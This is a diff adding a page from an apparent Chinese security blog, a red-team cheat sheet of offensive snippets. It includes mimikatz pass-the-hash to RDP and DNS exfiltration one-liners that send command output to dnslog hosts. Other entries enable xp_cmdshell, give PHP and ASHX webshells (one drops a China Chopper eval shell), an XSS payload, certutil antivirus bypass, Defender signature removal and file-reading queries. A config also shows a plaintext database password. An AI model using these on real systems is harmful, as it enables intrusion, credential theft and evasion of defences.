@@ -1,0 +1,627 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/b6.png">
+  <link rel="icon" type="image/png" href="/img/b6.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>一些日常小tips - Gr3yy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"gr3yyy123.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Gr3yy's B1og</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="一些日常小tips">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-03 05:20" pubdate>
+        February 3, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">一些日常小tips</h1>
+            
+            <div class="markdown-body">
+              <h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><h4 id="搜索引擎语法：https-blog-csdn-net-weixin-45116657-article-details-102761464"><a href="#搜索引擎语法：https-blog-csdn-net-weixin-45116657-article-details-102761464" class="headerlink" title="搜索引擎语法：https://blog.csdn.net/weixin_45116657/article/details/102761464"></a>搜索引擎语法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45116657/article/details/102761464">https://blog.csdn.net/weixin_45116657/article/details/102761464</a></h4><hr>
+<h4 id="CVE-2020-14386-Linux-kernel权限提升漏洞"><a href="#CVE-2020-14386-Linux-kernel权限提升漏洞" class="headerlink" title="CVE-2020-14386: Linux kernel权限提升漏洞 :"></a>CVE-2020-14386: Linux kernel权限提升漏洞 :</h4><p>内核提权漏洞，poc：<a target="_blank" rel="noopener" href="https://www.openwall.com/lists/oss-security/2020/09/03/3">https://www.openwall.com/lists/oss-security/2020/09/03/3</a></p>
+<hr>
+<p>php imap命令执行：imap_open调用rsh连接远程，但是debain默认使用ssh，ssh存在-o雕鹰系统命令，因此存在命令注入。</p>
+<p><img src="/img/article/typora-user-images%5Cimage-20201012131444039.png" srcset="/img/loading.gif" alt="image-20201012131444039"></p>
+<hr>
+<p>各种waf：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw">https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw</a></p>
+<hr>
+<p>excel导入打xxe</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3741">https://xz.aliyun.com/t/3741</a></p>
+<hr>
+<p>启动apache</p>
+<p><code>/etc/init.d/apache2 start</code></p>
+<hr>
+<p>ssh软连接</p>
+<p><a target="_blank" rel="noopener" href="https://www.jozxing.cc/archives/1653">https://www.jozxing.cc/archives/1653</a></p>
+<hr>
+<p>apache shiro</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nul1/p/12827021.html">https://www.cnblogs.com/nul1/p/12827021.html</a></p>
+<hr>
+<p>提权合集</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gijFjloNrEshsSaiMHr8oQ">https://mp.weixin.qq.com/s/gijFjloNrEshsSaiMHr8oQ</a></p>
+<hr>
+<p>jwt</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6776#toc-10">https://xz.aliyun.com/t/6776#toc-10</a></p>
+<hr>
+<p>winrm 执行命令、端口复用</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/k8gege/article/details/106442655">https://blog.csdn.net/k8gege/article/details/106442655</a></p>
+<hr>
+<p>红队工具</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/root-tools/redtool">https://github.com/root-tools/redtool</a></p>
+<hr>
+<p>pth+rdp</p>
+<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2020/01/18/5e22c1493adef/">https://www.dazhuanlan.com/2020/01/18/5e22c1493adef/</a></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">privilege</span><span class="hljs-selector-pseudo">::debug</span><br><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::pth</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:administrator</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:.</span> /<span class="hljs-selector-tag">ntlm</span><span class="hljs-selector-pseudo">:xxxxxxxxxxxxxxxxxxxxxx</span> &quot;/<span class="hljs-selector-tag">run</span><span class="hljs-selector-pseudo">:mstsc.exe</span> /<span class="hljs-selector-tag">restrictedadmin</span>&quot;<br></code></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">条件：<br><span class="hljs-keyword">Server</span>需要开启Restricted <span class="hljs-keyword">Admin</span> mode<br>Windows <span class="hljs-number">7</span> 和 Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2008</span> R2默认不支持，需要安装补丁<span class="hljs-number">2871997</span>、<span class="hljs-number">2973351</span><br></code></pre></td></tr></table></figure>
+<p>开启Restricted Admin mode:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\System\CurrentControlSet\Control\Lsa <span class="hljs-regexp">/v DisableRestrictedAdmin /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure>
+<hr>
+<p>设备默认口令</p>
+<p><a target="_blank" rel="noopener" href="http://www.srxh1314.com/mrkl.html">http://www.srxh1314.com/mrkl.html</a></p>
+<hr>
+<p>ue上传</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/42888106">https://zhuanlan.zhihu.com/p/42888106</a></p>
+<hr>
+<p>无回显外带</p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cmd</span> /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; <span class="hljs-built_in">findstr</span> /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; <span class="hljs-built_in">set</span> /p MYVAR=&lt; temp3 &amp;&amp; <span class="hljs-built_in">set</span> FINAL=<span class="hljs-variable">!MYVAR!</span>.b9530dbeff7692920356.d.zhack.ca &amp;&amp; nslookup <span class="hljs-variable">!FINAL!</span>&quot;<br><br>或<br><br><span class="hljs-keyword">for</span> /F &quot;delims=\ tokens=<span class="hljs-number">2</span>&quot; %i <span class="hljs-keyword">in</span> (&#x27;whoami&#x27;) <span class="hljs-keyword">do</span> <span class="hljs-built_in">ping</span> -n <span class="hljs-number">1</span> %i.bm21t3.dnslog.cn<br></code></pre></td></tr></table></figure>
+<hr>
+<p>pth + rdp</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">sekurlsa</span><span class="hljs-selector-pseudo">::pth</span> /<span class="hljs-selector-tag">user</span><span class="hljs-selector-pseudo">:administrator</span> /<span class="hljs-selector-tag">domain</span><span class="hljs-selector-pseudo">:.</span> /<span class="hljs-selector-tag">ntlm</span><span class="hljs-selector-pseudo">:xxxxxxxxxxxxxxxxxxxxxx</span> &quot;/<span class="hljs-selector-tag">run</span><span class="hljs-selector-pseudo">:mstsc.exe</span> /<span class="hljs-selector-tag">restrictedadmin</span>&quot;<br></code></pre></td></tr></table></figure>
+<hr>
+<p>清除日志</p>
+<p><img src="https://p6-tt-ipv6.byteimg.com/large/pgc-image/b2f859ff474f4dabb7390f10ea1dff59" srcset="/img/loading.gif" alt="img"></p>
+<hr>
+<p>linux提权：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&amp;mid=2651102317&amp;idx=1&amp;sn=0b0a840bd30896eb28b02ac117700bad&amp;chksm=bd1f0ee68a6887f00b1bfbf8996d516abfed498e264561e4d022de359beacb96efe10c000733&amp;scene=132#wechat_redirect</a></p>
+<hr>
+<p>mssql cmd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs mssql">-- 判断用户<br>and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;public&#39;) )--<br>and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) )--<br>and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;) )--<br><br>-- 开启xp_cmdshell<br>EXEC sp_configure &#39;show advanced options&#39;,1<br>RECONFIGURE<br><br>EXEC sp_configure &#39;xp_cmdshell&#39;,1<br>RECONFIGURE<br><br>EXEC master..xp_cmdshell &#39;123.zpu2he.dnslog.cn&#39;<br><br>-- RECONFIGURE报错的话就用<br>reconfigure with override<br></code></pre></td></tr></table></figure>
+<hr>
+<p>mysqldump</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">mysqldump --defaults-extra-<span class="hljs-keyword">file</span>=<span class="hljs-regexp">/tmp/</span><span class="hljs-number">11</span>.cnf --databases jiebei_com &gt;<span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/jb.com/</span><span class="hljs-keyword">runtime</span><span class="hljs-regexp">/log/</span><span class="hljs-number">202010</span>/jiebei_com.sql<br></code></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[client]</span><br><span class="hljs-attr">port</span> = <span class="hljs-number">3306</span><br><span class="hljs-attr">socket</span> = /tmp/mysql.sock<br><span class="hljs-attr">default-character-set</span> = utf8mb4<br><span class="hljs-attr">host</span> = <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><span class="hljs-attr">user</span> = <span class="hljs-string">&#x27;jiebei_com&#x27;</span><br><span class="hljs-attr">password</span> = <span class="hljs-string">&#x27;k7SHT62npa3j8RrS&#x27;</span><br></code></pre></td></tr></table></figure>
+<hr>
+<p>SimplyEmail</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">./<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SimplyEmail</span>.</span></span>py -all -v -e <br></code></pre></td></tr></table></figure>
+<hr>
+<p>xray扫描</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">.\<span class="hljs-selector-tag">xray_windows_amd64</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">webscan</span> <span class="hljs-selector-tag">--listen</span> 127.0.0.1<span class="hljs-selector-pseudo">:7777</span> <span class="hljs-selector-tag">--html-output</span> <span class="hljs-selector-tag">zyhy3</span><span class="hljs-selector-class">.html</span><br><span class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">lancher</span><span class="hljs-selector-class">.py</span><br></code></pre></td></tr></table></figure>
+<hr>
+<p>易受攻击点</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6I-Yp0A69rLr3RfruIAkhA">https://mp.weixin.qq.com/s/6I-Yp0A69rLr3RfruIAkhA</a></p>
+<hr>
+<p>cisco asa任意文件读取</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/cygenta/CVE-2020-3452/blob/main/CVE-2020-3452.py">https://github.com/cygenta/CVE-2020-3452/blob/main/CVE-2020-3452.py</a></p>
+<hr>
+<h4 id="Exchange-CVE-2020-17144"><a href="#Exchange-CVE-2020-17144" class="headerlink" title="Exchange CVE-2020-17144"></a>Exchange CVE-2020-17144</h4><p>poc: <a target="_blank" rel="noopener" href="https://srcincite.io/pocs/cve-2020-17141.py.txt">https://srcincite.io/pocs/cve-2020-17141.py.txt</a></p>
+<h4 id="CVE-2020-16875"><a href="#CVE-2020-16875" class="headerlink" title="CVE-2020-16875"></a>CVE-2020-16875</h4><p>poc: <a target="_blank" rel="noopener" href="https://srcincite.io/pocs/cve-2020-16875.py.txt">https://srcincite.io/pocs/cve-2020-16875.py.txt</a></p>
+<hr>
+<p>citrix xenmobile任意文件读取</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/jsp/</span>help-sb-download.jsp?sbFileName=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>
+<hr>
+<p>vmware文件读取：</p>
+<p><a target="_blank" rel="noopener" href="https://twitter.com/ptswarm/status/1316016337550938122">https://twitter.com/ptswarm/status/1316016337550938122</a></p>
+<hr>
+<p>内网不出网</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/IeH06p7pkQ3lmOehGLUWLg">https://mp.weixin.qq.com/s/IeH06p7pkQ3lmOehGLUWLg</a></p>
+<p>dnscat</p>
+<hr>
+<p>mysql 8.0新特性</p>
+<ul>
+<li><p>table:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]<br></code></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201210193347-9156b91a-3adb-1.png" srcset="/img/loading.gif" alt="img"></p>
+<ul>
+<li><p>value: </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select * from users where id &#x3D; 1 union values row(1,2,3)<br></code></pre></td></tr></table></figure>
+<hr>
+</li>
+</ul>
+<p>当php system没有调用cmd权限</p>
+<p>通过建立新的com对象调用其他的cmd.exe</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$command</span>=<span class="hljs-variable">$_POST</span>[a];<br><span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">new</span> COM(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>);   <span class="hljs-comment">// 生成一个COM对象</span><br><span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wsh</span>-&gt;exec(<span class="hljs-string">&#x27;cmd.exe /c &#x27;</span>.<span class="hljs-variable">$command</span>); <span class="hljs-comment">//调用对象方法来执行命令</span><br><span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;StdOut();<br><span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;ReadAll();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<hr>
+<p>xss payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;%00EEEE&lt;svg /\/\<span class="hljs-comment">//ONLoad=&#x27;a\u006c\u0065\u0072\u0074(1)&#x27;/\/\/\&gt;svg&gt;%0APayload</span><br></code></pre></td></tr></table></figure>
+<hr>
+<p>通过certutil进行编码解码文件bypass杀软</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 编码</span><br>Certutil -encode d:\artifact.exe d:\artifact.txt<br><br><span class="hljs-comment"># 写入</span><br><span class="hljs-built_in">echo</span> sfAFASFAsfasgasdf………&gt;&gt;d:\1.txt<br><br><span class="hljs-comment"># 解码</span><br>Certutil -decode d:\art.txt d:\art.exe<br></code></pre></td></tr></table></figure>
+<hr>
+<p>关闭defender</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>C:\PROGRA~1\WINDOW~1&gt;MpCmdRun.exe -RemoveDefinitions -all<br>MpCmdRun.exe -RemoveDefinitions -all<br><br>Service Version: 4.18.1812.3<br>Engine Version: 1.1.17600.5<br>AntiSpyware Signature Version: 1.327.2026.0<br>AntiVirus Signature Version: 1.327.2026.0<br>NRI Engine Version: 1.1.17600.5<br>NRI Signature Version: 1.327.2026.0<br><br>Starting engine and signature rollback to none...<br>Done!<br></code></pre></td></tr></table></figure>
+<hr>
+<p>站库分离操作内容</p>
+<ul>
+<li><p>mysql</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select @@hostname;                                 &#x2F;&#x2F;服务端主机名称<br>select * from information_schema.PROCESSLIST;      &#x2F;&#x2F;客户端主机名称和端口<br><br>select load_file(&#39;C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts&#39;);   &#x2F;&#x2F;读取文件<br>&#x2F;etc&#x2F;hosts<br>&#x2F;etc&#x2F;apache2&#x2F;apache2.conf<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf<br>&#x2F;etc&#x2F;udev&#x2F;rules.d&#x2F;70-persistent-net.rules          &#x2F;&#x2F;获取网卡名称<br>&#x2F;etc&#x2F;network&#x2F;interfaces                            &#x2F;&#x2F;DHCP或静态IP<br>&#x2F;var&#x2F;lib&#x2F;dhclient&#x2F;dhclient--网卡.lease             &#x2F;&#x2F;DHCP<br>&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-网卡          &#x2F;&#x2F;静态IP<br>C:&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts<br>C:&#x2F;Windows&#x2F;system32&#x2F;inetsrv&#x2F;MetaBase.xml<br>C:&#x2F;Windows&#x2F;System32&#x2F;inetsrv&#x2F;config&#x2F;applicationHost.config<br>C:&#x2F;phpStudy&#x2F;Apache&#x2F;conf&#x2F;httpd.conf<br>C:&#x2F;phpStudy&#x2F;Apache&#x2F;conf&#x2F;vhosts.conf<br>C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;Apache&#x2F;conf&#x2F;httpd.conf<br>C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;Apache&#x2F;conf&#x2F;vhosts.conf<br>C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<br>C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;nginx&#x2F;conf&#x2F;vhosts.conf<br></code></pre></td></tr></table></figure></li>
+<li><p>mssql</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">select host_name();                       &#x2F;&#x2F;客户端主机名称<br>select @@servername;                      &#x2F;&#x2F;服务端主机名称<br>select serverproperty(&#39;MachineName&#39;);     &#x2F;&#x2F;服务端主机名称<br><br>select name from master.sys.sysdatabases;    &#x2F;&#x2F;查看连接到数据库的机器名<br>select * from master.sys.sysprocesses where dbid&#x3D; db_id(&#39;sqlinject&#39;);<br></code></pre></td></tr></table></figure></li>
+<li><p>模拟令牌</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">只要有主机在使用Windows身份验证连接到这台数据库服务器的MSSQL时就会保留当前登录用户的令牌，而大多数人又都是以默认Administrator管理员来安装的MSSQL，所以能够直接获取到Administrator令牌。<br><br><span class="hljs-comment"># msf</span><br>meterpreter &gt; use Incognito<br></code></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<p>ashx webshell</p>
+<ul>
+<li>会自己生成一个aspx webshell</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ WebHandler Language&#x3D;&quot;C#&quot; Class&#x3D;&quot;Handler&quot; %&gt; <br>using System; <br>using System.Web; <br>using System.IO; <br>public class Handler : IHttpHandler &#123; <br>    public void ProcessRequest (HttpContext context) &#123; <br>        context.Response.ContentType &#x3D; &quot;text&#x2F;plain&quot;; <br>        string show&#x3D;&quot;&lt;%@ Page Language&#x3D;\&quot;Jscript\&quot;%&gt;&lt;%eval(Request.Item[\&quot;chopper\&quot;],\&quot;unsafe\&quot;);%&gt;&quot;; <br>        StreamWriter file1&#x3D; File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); <br>        file1.Write(show); <br>        file1.Flush(); <br>        file1.Close(); <br>    &#125; <br>    public bool IsReusable &#123; <br>        get &#123; <br>            return false; <br>        &#125; <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure>
+<hr>
+<p>ssh 反向端口转发</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">ssh</span> <span class="hljs-selector-tag">-R</span> 0.0.0.0<span class="hljs-selector-pseudo">:rport</span><span class="hljs-selector-pseudo">:localhost</span><span class="hljs-selector-pseudo">:lport</span> <span class="hljs-selector-tag">root</span><span class="hljs-keyword">@x</span>.x.x.x<br></code></pre></td></tr></table></figure>
+<hr>
+<p>禁用theme主题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language&#x3D;&quot;Jscript&quot; EnableTheming &#x3D; &quot;False&quot; StylesheetTheme&#x3D;&quot;&quot; Theme&#x3D;&quot;&quot; %&gt;<br></code></pre></td></tr></table></figure>
+<hr>
+<p>ue不出网利用</p>
+<ul>
+<li><p>上传本地</p>
